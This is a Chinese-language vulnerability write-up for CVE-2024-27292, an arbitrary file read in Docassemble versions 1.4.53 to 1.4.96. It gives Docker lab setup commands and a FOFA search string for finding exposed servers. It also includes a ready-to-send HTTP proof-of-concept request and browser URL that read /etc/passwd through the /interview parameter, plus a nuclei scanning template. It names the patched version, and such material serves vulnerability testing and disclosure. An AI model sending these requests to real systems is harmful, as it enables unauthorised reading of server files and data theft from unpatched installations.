**漏洞名称**

Docassemble任意文件读取漏洞

**漏洞影响**

docassemble的1.4.53到1.4.96的版本均受影响，master分支的1.4.97版本中已对该漏洞进行了修补。

https:*//github.com/jhpyle/docassemble*

**靶场搭建**

```yaml
git clone https://github.com/jhpyle/docassemble
cd docassemble
git checkout v1.4.96
docker build -t yourname/mydocassemble .
cd ..
docker run -d -p 80:80 -p 443:443 --restart always --stop-timeout 600 yourname/mydocassemble
```

**漏洞描述**


Docassemble是一个基于Python、YAML和Markdown的免费、开源的专家系统，用于指导面试和文件组装。该系统/interview接口处存在任意文件读取漏洞，会导致服务器数据泄露，请及时修复

**FOFA搜索语句**

icon_hash="-575790689"

**漏洞复现**

POC数据包如下，读取/etc/passwd文件内容

```yaml
GET /interview?i=/etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/9.1.2 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

get请求，直接用浏览器访问即可

```yaml
http://x.x.x.x/interview?i=/etc/passwd
```

**nuclei poc**

```yaml
id: CVE-2024-27292

info:
  name: Docassemble任意文件读取漏洞
  author: fgz
  severity: high
  description: |
    Docassemble is an expert system for guided interviews and document assembly. The vulnerability allows attackers to gain unauthorized access to information on the system through URL manipulation. It affects versions 1.4.53 to 1.4.96. The vulnerability has been patched in version 1.4.97 of the master branch.
  reference:
    - https://tantosec.com/blog/docassemble/
    - https://github.com/jhpyle/docassemble/security/advisories/GHSA-jq57-3w7p-vwvv
    - https://github.com/jhpyle/docassemble/commit/97f77dc486a26a22ba804765bfd7058aabd600c9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-27292
    cwe-id: CWE-706
    epss-score: 0.00043
    epss-percentile: 0.0866
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"docassemble"
    fofa-query: icon_hash="-575790689"
  tags: cve,cve2024,docassemble,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/interview?i=/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 501
```

